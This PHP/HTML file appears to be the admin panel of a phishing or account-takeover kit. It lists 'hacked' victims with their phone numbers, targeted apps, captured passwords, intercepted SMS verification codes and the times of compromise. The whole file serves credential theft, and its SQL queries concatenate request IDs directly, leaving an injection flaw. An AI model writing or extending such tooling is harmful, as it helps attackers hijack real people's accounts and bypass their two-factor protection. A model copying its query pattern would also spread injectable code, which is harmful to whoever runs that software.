<?php
$hackks = $c->query("SELECT * FROM accounts WHERE hacked = 1");
$hd_row = $hackks->num_rows;

if($hd_row > 0) {
?>
<div class="container" style="padding-left: 0px !important;padding-right: 0px !important;">
<div class="hacked-table">
	<table class="table table-bordered table-inverse table-hover">
		<thead>
			<tr>
				<th>ID</th>
				<th>Device</th>
				<th>Phone</th>
				<th>App</th>
				<th>Version</th>
				<th>Password</th>
				<th>Text Code</th>
				<th>SMS Recived</th>
				<th>Access Time</th>
				<th>Hacked Time</th>
			</tr>
		</thead>
		<tbody>
			<?php
			while ($zip = $hackks->fetch_array()) {

			$acc = $c->query("SELECT * FROM access WHERE request_id = '".$zip['request_id']."'");
			$acz = $acc->fetch_array();

			$plat = $c->query("SELECT * FROM platform WHERE request_id = '".$zip['request_id']."'");
			$plaz = $plat->fetch_array();

			$sms = $c->query("SELECT * FROM sms WHERE request_id = '".$zip['request_id']."'");
			$coz = $sms->fetch_array();

			$pass = $c->query("SELECT * FROM ptemp WHERE verify = 'valid' AND request_id = '".$zip['request_id']."'");
			$paz = $pass->fetch_array();

			$id =($zip['request_id'] == ''|| $zip['request_id'] == null)? '' : $zip['request_id'];
			$device =($acz['device'] == ''|| $acz['device'] == null)? '' : $acz['device'];  
			$phone =($zip['phone'] == ''|| $zip['phone'] == null)? '' : $zip['phone'];
			$app =($plaz['app'] == ''|| $plaz['app'] == null)? '' : $plaz['app'];
			$version =($plaz['version'] == ''|| $plaz['version'] == null)? '' : $plaz['version'];
			@$password =($paz['password'] == ''|| $paz['password'] == null)? '' : $paz['password'];
			$code =($coz['code'] == ''|| $coz['code'] == null)? '' : $coz['code'];
			$sms =($coz['timer'] == ''|| $coz['timer'] == null)? '' : $coz['timer'];
			$access =($acz['timer'] == ''|| $acz['timer'] == null)? '' : $acz['timer'];  
			$hacked =($zip['timer'] == ''|| $zip['timer'] == null)? '' : $zip['timer'];  
			$cog = new cog();
			?>
				<tr>
					<td><?php echo $id; ?></td>
					<td><?php echo $device; ?></td>
					<td><?php echo $phone; ?></td>
					<td><?php echo $app; ?></td>
					<td><?php echo $version; ?></td>
					<td><?php echo $password; ?></td>
					<td><?php echo $code; ?></td>
					<td><?php echo $cog->time_ago($sms); ?></td>
					<td><?php echo $cog->time_ago($access); ?></td>
					<td><?php echo $cog->time_ago($hacked); ?></td>
				</tr>
			<?php 
			}
			?>
		</tbody>
	</table>
	<button class="card-link btn btn-outline-success float-right mr-3" onclick="showme('home')"><i class="fa fa-arrow-left "></i> Back</button>
	<button class="card-link btn btn-outline-success float-right mr-3" onclick="showme('all_hacked')"><i class="fa fa-refresh "></i> Refresh</button>
</div>
</div>
<?php
}else {
?>
	<center><h5 class="text-muted">no result</h5></center>
<?php
}
?>